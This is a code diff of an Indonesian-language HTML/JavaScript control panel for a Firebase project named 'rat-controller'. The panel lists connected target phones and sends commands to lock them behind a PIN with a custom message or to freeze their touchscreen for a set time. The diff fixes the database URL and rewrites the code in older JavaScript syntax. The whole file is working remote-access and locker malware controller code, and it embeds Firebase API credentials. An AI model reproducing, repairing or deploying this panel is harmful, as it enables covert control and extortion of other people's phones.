@@ -232,7 +232,6 @@
             <span>Status:</span> <span id="deviceStatus">-</span>
         </div>
 
-        <!-- SECTION 1: LOCK DEVICE -->
         <div class="section">
             <div class="section-title"><span class="icon">🔒</span> LOCK DEVICE</div>
             <div class="pin-dots">
@@ -251,7 +250,6 @@
             </div>
         </div>
 
-        <!-- SECTION 2: TOUCH BLOCK -->
         <div class="section" style="border-color:#ffaa00;">
             <div class="section-title" style="color:#ffaa00;"><span class="icon">✋</span> TOUCH BLOCK (FREEZE HP)</div>
             <div class="touch-duration">
@@ -276,17 +274,16 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
         // ============================================================
-        // 🔥 DATA FIREBASE ANDA (GANTI DENGAN PUNYA SENDIRI)
+        // 🔥 DATA FIREBASE ANDA - SUDAH FIX
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
             authDomain: "rat-controller-5b29c.firebaseapp.com",
-            databaseURL: "https://rat-controller-5b29c-default-rtdb.azurewebsites.net",
+            databaseURL: "https://rat-controller-5b29c-default-rtdb.asia-southeast1.firebasedatabase.app",
             projectId: "rat-controller-5b29c",
             storageBucket: "storage.googleapis.com",
             messagingSenderId: "928595828959",
-            appId: "1:928595828959:web:e4715e3095f7456d5896a",
-            measurementId: "G-821ZZ77TPS"
+            appId: "1:928595828959:web:e4715e3095f7456d5896a"
         };
 
         firebase.initializeApp(firebaseConfig);
@@ -318,10 +315,13 @@
             return parseInt(document.getElementById('touchDuration').value) || 10;
         }
 
-        function addLog(text, type = 'info') {
-            const div = document.createElement('div');
+        function addLog(text, type) {
+            type = type || 'info';
+            var div = document.createElement('div');
             div.className = type;
-            div.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+            var d = new Date();
+            var time = d.getHours() + ':' + String(d.getMinutes()).padStart(2,'0') + ':' + String(d.getSeconds()).padStart(2,'0');
+            div.textContent = '[' + time + '] ' + text;
             logArea.appendChild(div);
             logArea.scrollTop = logArea.scrollHeight;
             if (logArea.children.length > 25) {
@@ -329,14 +329,13 @@
             }
         }
 
-        // ============ LISTEN TARGETS ============
-        db.ref('targets').on('value', (snapshot) => {
-            const data = snapshot.val();
+        db.ref('targets').on('value', function(snapshot) {
+            var data = snapshot.val();
             targets = data || {};
             renderTargetList();
             
             if (!selectedTarget && Object.keys(targets).length > 0) {
-                const firstId = Object.keys(targets)[0];
+                var firstId = Object.keys(targets)[0];
                 selectTarget(firstId);
             }
             
@@ -346,22 +345,18 @@
         });
 
         function renderTargetList() {
-            const keys = Object.keys(targets);
+            var keys = Object.keys(targets);
             if (keys.length === 0) {
-                targetList.innerHTML = `
-                    <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
-                        ⚠️ Tidak ada target terhubung
-                    </div>
-                `;
+                targetList.innerHTML = '<div style="text-align:center; color:#666; padding:10px; font-size:12px;">⚠️ Tidak ada target terhubung</div>';
                 return;
             }
 
             targetList.innerHTML = '';
-            keys.forEach(id => {
-                const t = targets[id];
-                const div = document.createElement('div');
-                let statusText = '🔓 UNLOCKED';
-                let statusClass = 'unlocked';
+            keys.forEach(function(id) {
+                var t = targets[id];
+                var div = document.createElement('div');
+                var statusText = '🔓 UNLOCKED';
+                var statusClass = 'unlocked';
                 if (t.touchBlocked) {
                     statusText = '✋ FREEZE';
                     statusClass = 'touchblock';
@@ -369,18 +364,9 @@
                     statusText = '🔒 LOCKED';
                     statusClass = 'locked';
                 }
-                div.className = `target-item ${selectedTarget === id ? 'active' : ''}`;
-                div.innerHTML = `
-                    <div>
-                        <div class="name">${t.deviceName || 'Unknown'}</div>
-                        <div class="id">${id.slice(0,8)}</div>
-                    </div>
-                    <div style="text-align:right;">
-                        <div class="status ${statusClass}">${statusText}</div>
-                        <div style="font-size:9px; color:#666;">${t.online ? '🟢 Online' : '🔴 Offline'}</div>
-                    </div>
-                `;
-                div.onclick = () => selectTarget(id);
+                div.className = 'target-item' + (selectedTarget === id ? ' active' : '');
+                div.innerHTML = '<div><div class="name">' + (t.deviceName || 'Unknown') + '</div><div class="id">' + id.slice(0,8) + '</div></div><div style="text-align:right;"><div class="status ' + statusClass + '">' + statusText + '</div><div style="font-size:9px; color:#666;">' + (t.online ? '🟢 Online' : '🔴 Offline') + '</div></div>';
+                div.onclick = function() { selectTarget(id); };
                 targetList.appendChild(div);
             });
         }
@@ -394,12 +380,12 @@
                 lockBtn.disabled = false;
                 unlockBtn.disabled = false;
                 touchBlockBtn.disabled = false;
-                addLog(`Target selected: ${targets[id].deviceName || id.slice(0,8)}`, 'action');
+                addLog('Target selected: ' + (targets[id].deviceName || id.slice(0,8)), 'action');
             }
         }
 
         function updateInfo(id) {
-            const t = targets[id];
+            var t = targets[id];
             if (!t) {
                 deviceName.textContent = '-';
                 deviceStatus.textContent = '-';
@@ -409,7 +395,7 @@
                 return;
             }
             deviceName.textContent = t.deviceName || 'Unknown';
-            let status = '🔓 UNLOCKED';
+            var status = '🔓 UNLOCKED';
             if (t.touchBlocked) {
                 status = '✋ FREEZE';
             } else if (t.locked) {
@@ -421,69 +407,66 @@
             touchBlockBtn.disabled = false;
         }
 
-        // ============ LOCK DEVICE ============
         document.getElementById('lockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            const pin = getPin();
-            const message = getMessage();
+            var pin = getPin();
+            var message = getMessage();
 
             if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
                 addLog('PIN harus 4 digit angka!', 'error');
                 return;
             }
 
-            const ref = db.ref(`targets/${selectedTarget}`);
+            var ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 locked: true,
                 pin: pin,
                 message: message,
                 lockTime: Date.now(),
                 touchBlocked: false
-            }).then(() => {
-                addLog(`🔒 DEVICE LOCKED: ${selectedTarget.slice(0,8)} | PIN: ${pin}`, 'success');
-            }).catch(err => {
-                addLog(`Gagal lock: ${err.message}`, 'error');
+            }).then(function() {
+                addLog('🔒 DEVICE LOCKED: ' + selectedTarget.slice(0,8) + ' | PIN: ' + pin, 'success');
+            }).catch(function(err) {
+                addLog('Gagal lock: ' + err.message, 'error');
             });
         };
 
-        // ============ UNLOCK DEVICE ============
         document.getElementById('unlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            const ref = db.ref(`targets/${selectedTarget}`);
+            var ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 locked: false,
                 pin: null,
                 message: null,
                 touchBlocked: false
-            }).then(() => {
-                addLog(`🔓 DEVICE UNLOCKED: ${selectedTarget.slice(0,8)}`, 'success');
-            }).catch(err => {
-                addLog(`Gagal unlock: ${err.message}`, 'error');
+            }).then(function() {
+                addLog('🔓 DEVICE UNLOCKED: ' + selectedTarget.slice(0,8), 'success');
+            }).catch(function(err) {
+                addLog('Gagal unlock: ' + err.message, 'error');
             });
         };
 
-        // ============ TOUCH BLOCK (FREEZE) ============
         document.getElementById('touchBlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            const duration = getTouchDuration();
+            var duration = getTouchDuration();
             if (duration < 1 || duration > 300) {
                 addLog('Durasi harus 1-300 detik!', 'error');
                 return;
             }
 
-            const ref = db.ref(`targets/${selectedTarget}`);
+            var ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 touchBlocked: true,
                 touchDuration: duration,
@@ -491,20 +474,19 @@
                 locked: false,
                 pin: null,
                 message: null
-            }).then(() => {
-                addLog(`✋ HP FREEZE: ${selectedTarget.slice(0,8)} | Durasi: ${duration} detik`, 'touch');
-                // Auto-unfreeze setelah durasi selesai
-                setTimeout(() => {
+            }).then(function() {
+                addLog('✋ HP FREEZE: ' + selectedTarget.slice(0,8) + ' | Durasi: ' + duration + ' detik', 'touch');
+                setTimeout(function() {
                     ref.update({
                         touchBlocked: false,
                         touchDuration: null,
                         touchBlockTime: null
-                    }).then(() => {
-                        addLog(`✅ HP UNFREEZE: ${selectedTarget.slice(0,8)} (otomatis)`, 'success');
-                    }).catch(() => {});
+                    }).then(function() {
+                        addLog('✅ HP UNFREEZE: ' + selectedTarget.slice(0,8) + ' (otomatis)', 'success');
+                    }).catch(function() {});
                 }, duration * 1000);
-            }).catch(err => {
-                addLog(`Gagal freeze: ${err.message}`, 'error');
+            }).catch(function(err) {
+                addLog('Gagal freeze: ' + err.message, 'error');
             });
         };
 
